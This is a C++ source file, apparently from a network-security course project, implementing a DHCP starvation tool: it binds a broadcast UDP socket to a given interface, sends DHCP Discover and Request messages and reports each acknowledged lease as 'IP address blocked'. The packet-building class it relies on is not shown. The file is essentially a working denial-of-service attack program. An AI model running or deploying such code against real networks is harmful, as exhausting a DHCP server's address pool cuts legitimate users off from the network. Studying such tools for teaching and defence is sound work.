#include "include/pds-dhcpstarve.h"
#include "include/pds-dhcpCore.h"
//#include "include/pds-RawSocketHelper.h"

// 12 bytes pseudo header for udp checksum calculation
/*struct pseudoUDPHeader
{
	uint32_t source_address;
	uint32_t dest_address;
	uint8_t placeholder;
	uint8_t protocol;
	uint16_t udp_length;
};

// checksum calculation function
unsigned short csum(unsigned short *ptr, int nbytes)
{
	register long sum;
	unsigned short oddbyte;
	register short answer;

	sum = 0;
	while (nbytes>1) {
		sum += *ptr++;
		nbytes -= 2;
	}
	if (nbytes == 1) {
		oddbyte = 0;
		*((u_char*)&oddbyte) = *(u_char*)ptr;
		sum += oddbyte;
	}

	sum = (sum >> 16) + (sum & 0xffff);
	sum = sum + (sum >> 16);
	answer = (short)~sum;

	return(answer);
}*/

std::mutex socketMutex, threadNumberMutex, ipAddressMutex;

int sendMessage(int socket, char* message, int messageLength, sockaddr* serverSettings)
{
	std::lock_guard<std::mutex> guard(socketMutex);
	sendto(socket, message, messageLength, 0, serverSettings, sizeof(sockaddr));
}

int tryGetMessage(int socket, char* message, int &messageLength, uint32_t xid)
{
	std::lock_guard<std::mutex> guard(socketMutex);

	// address of dhcp server -> filled together with response
	sockaddr_in si_other;
	unsigned slen = sizeof(sockaddr);
	int receivedSize = recvfrom(socket, message, messageLength, MSG_PEEK | MSG_DONTWAIT, (sockaddr *)&si_other, &slen);
	if(xid == DHCPCore::getXID(message, receivedSize))
	{
		messageLength = recvfrom(socket, message, messageLength, MSG_DONTWAIT, (sockaddr *)&si_other, &slen);
		return 1;
	}
	return 0;
}


int dhcpStarveClient(int socket, struct sockaddr_in &serverSettings)
{
	// create instance of dhcp starve core class
	DHCPCore* dhcpCoreInstance = new DHCPCore();
	// create DHCP Discover message
	dhcpCoreInstance->createDHCPDiscoverMessage();
	if (dhcpCoreInstance->isError())
	{
		// error occured tidy up and exit
		delete(dhcpCoreInstance);
		return(1);
	}
	// send message
	//sendto(senderSocket, dhcpCoreInstance->getMessage(), dhcpCoreInstance->getSizeOfMessage(), 0, (sockaddr*)&serverSettings, sizeof(serverSettings));
	sendMessage(socket, dhcpCoreInstance->getMessage(), dhcpCoreInstance->getSizeOfMessage(), (sockaddr*)&serverSettings);

	// start timer to check if we already do not wait to long for offer
	auto timeStart = std::chrono::high_resolution_clock::now();
	// get the response -> is blocking if no response, the code will get stack
	// TO-DO: Check what happend if pool is dried out
	char message[ETHERNET_MTU];
	int messageLength = ETHERNET_MTU;
	// wait for DHCPOFFER	
	while(true)
	{
		std::memset(&message, 0, sizeof(message));
		int forMe = tryGetMessage(socket, &message[0], messageLength, dhcpCoreInstance->getCurrentXID());
		if(forMe)
		{
			if(dhcpCoreInstance->getState() == DHCP_TYPE_DISCOVER)
			{
				// load response to dhcp_packet struct
				dhcpCoreInstance->ProcessDHCPOfferMessage(message, messageLength);
				if (dhcpCoreInstance->isError())
				{
					// error occured tidy up and exi
					delete(dhcpCoreInstance);
					return(1);
				}
				sendMessage(socket, dhcpCoreInstance->getMessage(), dhcpCoreInstance->getSizeOfMessage(), (sockaddr*)&serverSettings);
			}
			else if(dhcpCoreInstance->getState() == DHCP_TYPE_REQUEST)
			{
				dhcpCoreInstance->ProcessDHCPAckMessage(message, messageLength);
				if (dhcpCoreInstance->isError())
				{
					// error occured tidy up and exi
					delete(dhcpCoreInstance);
					return(1);
				}
				// check if ack obtained
				if(dhcpCoreInstance->getState() == DHCP_TYPE_ACK)
				{
					fprintf(stdout, "IP address blocked!\n");
					break;
				}
			}
		}
		// not my packet, try again in a time or end if we waited too long
		// check if wait more
		std::chrono::duration<double, std::milli> ms = std::chrono::high_resolution_clock::now() - timeStart;
		if(ms.count() > WAIT_FOR_RESPONSE_TIME)
		{
			fprintf(stderr, "Time out for offer!\n");
			delete(dhcpCoreInstance);
			return(1);
		} 
		// sleep for a while
		std::this_thread::sleep_for(std::chrono::milliseconds(WAIT_BEFORE_CHECK_SOCKET_AGAIN));
	}

	// clean and exit thread

	delete(dhcpCoreInstance);
	return(1);
}



int main(int argc, char* argv[])
{
	// parse the parameters using getopt
	std::string chosenInterface = "";
	int c;
	bool errorFlag = false;

	if (argc != 3) {
		std::cerr << "Incorrect number of params, exiting program." << std::endl;
		return INCORRECT_PARAMS;
	}

	while ((c = getopt(argc, argv, "i:")) != -1) {
		switch (c) {
		case 'i':
			chosenInterface = optarg;
			break;
		case ':':
			std::cerr << "Option -" << optopt << "requires an operand" << std::endl;
			errorFlag = true;
			break;
		case '?':
			std::cerr << "Unrecognized option: " << optopt << std::endl;
			errorFlag = true;
			break;
		}
	}

	if (errorFlag || chosenInterface.empty()) {
		std::cerr << "Incorrect params, exiting program." << std::endl;
		return INCORRECT_PARAMS;
	}

	std::cout << "Interface: " << chosenInterface << std::endl;


	// SOCKET FOR SENDING --------------------------------------------------------------------
	// create socket and send message 
	int senderSocket = 0;
	if ((senderSocket = socket(AF_INET, SOCK_DGRAM, 0)) < 0)
	{
		fprintf(stderr, "Cannot create socket.");
		exit(1);
	}

	// bind socket to given interface
	struct ifreq ifr;
	memset(&ifr, 0, sizeof(ifr));
	memcpy(&ifr.ifr_name, chosenInterface.c_str(), sizeof(ifr.ifr_name));
	if(setsockopt(senderSocket, SOL_SOCKET, SO_BINDTODEVICE, (void*)&ifr, sizeof(ifr)) < 0)
	{
		fprintf(stderr, "Cannot assign socket to interface: %s. %s\n", chosenInterface.c_str(), strerror(errno));
		exit(1);
	}
	// enable broadcast on socket
	int optVal = 1;
	if(setsockopt(senderSocket, SOL_SOCKET, SO_BROADCAST, &optVal, sizeof(optVal)) < 0)
	{
		fprintf(stderr, "Cannot set socket to broadcast: %s. %s\n", chosenInterface.c_str(), strerror(errno));
		exit(1);
	}
	if(setsockopt(senderSocket, SOL_SOCKET, SO_REUSEADDR, &optVal, sizeof(optVal)) < 0)
	{
		fprintf(stderr, "Cannot set socket to broadcast: %s. %s\n", chosenInterface.c_str(), strerror(errno));
		exit(1);
	}	
	struct sockaddr_in interfaceSettings;
	// set parameter and bind to socket to specific interface
	interfaceSettings.sin_family = AF_INET;
	interfaceSettings.sin_port = htons(DHCP_CLIENT_PORT);
	interfaceSettings.sin_addr.s_addr = INADDR_ANY;
	if (bind(senderSocket, (sockaddr*)&interfaceSettings, sizeof(interfaceSettings)) < 0)
	{ // cannot bind socket to given address and port
		fprintf(stderr, "Cannot bind socket to interface: %s. %s\n", chosenInterface.c_str(), strerror(errno));
		exit(1);
	}
	
	// set parameters for server address and connect socket to it
	struct sockaddr_in serverSettings;
	memset(&serverSettings, 0, sizeof serverSettings);
	serverSettings.sin_family = AF_INET;
	serverSettings.sin_port = htons(DHCP_SERVER_PORT);
	// set IPv4 broadcast
	if ((inet_pton(AF_INET, DHCP_SERVER_ADDRESS, &serverSettings.sin_addr)) <= 0)
	{
		fprintf(stderr, "Cannot set server address (%s) -> inet_pton error.\n", DHCP_SERVER_ADDRESS);
		exit(1);
	}

	// --------------------------- COMMUNICATION START -------------------------------------------------
	int ret = dhcpStarveClient(senderSocket, serverSettings);

	exit(ret);
}
